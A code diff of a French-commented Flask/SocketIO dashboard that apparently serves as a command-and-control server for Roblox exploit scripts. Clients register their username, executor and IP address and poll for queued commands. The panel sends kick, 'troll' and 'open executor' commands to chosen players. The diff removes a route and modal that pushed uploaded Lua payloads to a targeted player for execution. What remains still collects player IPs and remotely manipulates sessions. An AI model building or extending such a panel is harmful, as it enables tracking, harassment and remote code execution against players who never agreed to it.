@@ -5,14 +5,14 @@ import eventlet
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "change_this_secret_key_123456789"
+app.config["SECRET_KEY"] = "change_me_to_something_very_long_and_random_123456789"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# === TES IPs AUTORISÉES (change-les !) ===
+# === CHANGE CES IPs AVEC LES TIENNES ===
 ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 
 connected_players = {}
-pending_commands = {}  # maintenant on stocke des dicts {command: "...", payload: "..."} ou simple string
+pending_commands = {}
 
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -35,7 +35,7 @@ def access_denied(e):
 
 @app.before_request
 def protect_routes():
-    if request.path in ["/", "/kick", "/troll", "/upload_payload"]:
+    if request.path in ["/", "/kick", "/troll"]:
         check_ip()
 
 HTML = """<!DOCTYPE html>
@@ -67,7 +67,7 @@ button.kick-btn:hover{transform:scale(1.05)}
 .modal.active{display:flex}
 .modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
 .modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
-.modal-content input[type=file]{width:100%;padding:15px;background:#222;color:white;border-radius:12px;margin:20px 0}
+.modal-content input{width:100%;padding:15px;background:#222;color:white;border-radius:12px;margin:20px 0}
 .modal-buttons{display:flex;gap:15px}
 .modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
 .confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
@@ -85,14 +85,14 @@ button.kick-btn:hover{transform:scale(1.05)}
     <div class="grid" id="players"></div>
 </div>
 
-<!-- Modal Import Payload -->
-<div class="modal" id="payloadModal">
+<!-- Modal Kick -->
+<div class="modal" id="kickModal">
     <div class="modal-content">
-        <h2>Import & Execute Payload (.lua)</h2>
-        <input type="file" id="payloadFile" accept=".lua,text/plain">
+        <h2>Kick Player</h2>
+        <input type="text" id="kickReason" placeholder="Raison (optionnel)" autofocus>
         <div class="modal-buttons">
-            <button class="cancel-btn" onclick="closePayloadModal()">Cancel</button>
-            <button class="confirm-btn" onclick="sendPayload()">EXECUTE</button>
+            <button class="cancel-btn" onclick="document.getElementById('kickModal').classList.remove('active')">Annuler</button>
+            <button class="confirm-btn" onclick="performKick()">Confirmer</button>
         </div>
     </div>
 </div>
@@ -111,43 +111,22 @@ function toast(msg, type="success") {
     setTimeout(() => t.remove(), 5000);
 }
 
-function openPayloadModal(id) {
+function openKickModal(id) {
     targetUserId = id;
-    document.getElementById("payloadModal").classList.add("active");
-}
-function closePayloadModal() {
-    document.getElementById("payloadModal").classList.remove("active");
-    document.getElementById("payloadFile").value = "";
+    document.getElementById("kickModal").classList.add("active");
+    document.getElementById("kickReason").focus();
 }
 
-function sendPayload() {
-    const fileInput = document.getElementById("payloadFile");
-    if (!fileInput.files[0]) return toast("Aucun fichier sélectionné", "danger");
-    
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        const payload = e.target.result;
-        fetch("/upload_payload", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({userid: targetUserId, payload: payload})
-        }).then(r => r.json()).then(() => {
-            toast("Payload exécuté sur " + (connected_players[targetUserId]?.username || "joueur"), "danger");
-            closePayloadModal();
-        });
-    };
-    reader.readAsText(fileInput.files[0]);
+function performKick() {
+    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
+    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: targetUserId, reason: reason})});
+    toast("Kick envoyé", "danger");
+    document.getElementById("kickModal").classList.remove("active");
 }
 
 function sendTroll(id, cmd) {
     fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
-    toast(cmd.toUpperCase() + " envoyé");
-}
-
-function openKickModal(id) {
-    targetUserId = id;
-    document.getElementById("kickReason").focus();
-    document.getElementById("kickModal").classList.add("active");
+    toast(cmd.toUpperCase() + " envoyé", "danger");
 }
 
 socket.on("update", data => {
@@ -156,8 +135,9 @@ socket.on("update", data => {
     const current = new Set(Object.keys(data.players));
 
     Object.entries(data.players).forEach(([id, p]) => {
-        let card = document.getElementById("card_"+id) || document.createElement("div");
-        card.className = "card"; card.id = "card_"+id;
+        let card = document.getElementById("card_"+id);
+        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = "card_"+id; grid.appendChild(card); }
+
         card.innerHTML = `
             <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
             <div class="name"><a href="https://roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
@@ -174,10 +154,10 @@ socket.on("update", data => {
                 <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
             </div>
 
-            <div class="category">PAYLOAD</div>
+            <div class="category">EXECUTOR</div>
             <div style="display:grid;grid-template-columns:1fr;gap:8px;">
-                <button class="kick-btn" style="background:linear-gradient(45deg,#ff8800,#ff00ff);font-size:1.2rem;padding:18px;" onclick="openPayloadModal('${id}')">
-                    IMPORT & EXECUTE PAYLOAD
+                <button class="kick-btn" style="background:linear-gradient(45deg,#00ff00,#00aa00);font-size:1.3rem;padding:20px;" onclick="sendTroll('${id}','open_executor')">
+                    OUVRIR EXECUTOR (Insert)
                 </button>
             </div>
 
@@ -188,7 +168,6 @@ socket.on("update", data => {
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
             </div>
         `;
-        if (!document.getElementById("card_"+id)) grid.appendChild(card);
     });
 
     document.querySelectorAll('.card').forEach(c => {
@@ -196,7 +175,8 @@ socket.on("update", data => {
     });
 });
 </script>
-</body></html>"""
+</body>
+</html>"""
 
 @app.route("/")
 def index():
@@ -208,13 +188,13 @@ def api():
     if request.method == "POST":
         try:
             d = request.get_json(silent=True) or {}
-            uid = str(d.get("userid",""))
+            uid = str(d.get("userid", ""))
             action = d.get("action")
             if action == "register" and uid:
                 connected_players[uid] = {
-                    "username": d.get("username","Unknown"),
-                    "executor": d.get("executor","Unknown"),
-                    "ip": d.get("ip","Unknown"),
+                    "username": d.get("username", "Unknown"),
+                    "executor": d.get("executor", "Unknown"),
+                    "ip": d.get("ip", "Unknown"),
                     "last": now,
                     "online": True
                 }
@@ -225,7 +205,7 @@ def api():
         return jsonify({"ok": True})
 
     elif request.method == "GET":
-        uid = request.args.get("userid","")
+        uid = request.args.get("userid", "")
         if uid and uid in pending_commands:
             cmd = pending_commands.pop(uid)
             return jsonify(cmd)
@@ -235,8 +215,8 @@ def api():
 def kick():
     check_ip()
     data = request.get_json() or {}
-    uid = str(data.get("userid",""))
-    reason = data.get("reason","Kicked by admin")
+    uid = str(data.get("userid", ""))
+    reason = data.get("reason", "Kicked by admin")
     if uid:
         pending_commands[uid] = {"command": "kick", "reason": reason}
     return jsonify({"sent": True})
@@ -245,22 +225,12 @@ def kick():
 def troll():
     check_ip()
     data = request.get_json() or {}
-    uid = str(data.get("userid",""))
-    cmd = data.get("cmd","")
+    uid = str(data.get("userid", ""))
+    cmd = data.get("cmd", "")
     if uid and cmd:
         pending_commands[uid] = {"command": cmd}
-    return jsonify({"sent": True})
-
-@app.route("/upload_payload", methods=["POST"])
-def upload_payload():
-    check_ip()
-    data = request.get_json() or {}
-    uid = str(data.get("userid",""))
-    payload = data.get("payload","")
-    if uid and payload:
-        pending_commands[uid] = {"command": "execute_payload", "payload": payload}
         username = connected_players.get(uid, {}).get("username", "Unknown")
-        socketio.emit("kick_notice", {"username": username, "reason": "PAYLOAD EXECUTED"})
+        socketio.emit("kick_notice", {"username": username, "reason": cmd.upper()})
     return jsonify({"sent": True})
 
 def broadcast_loop():
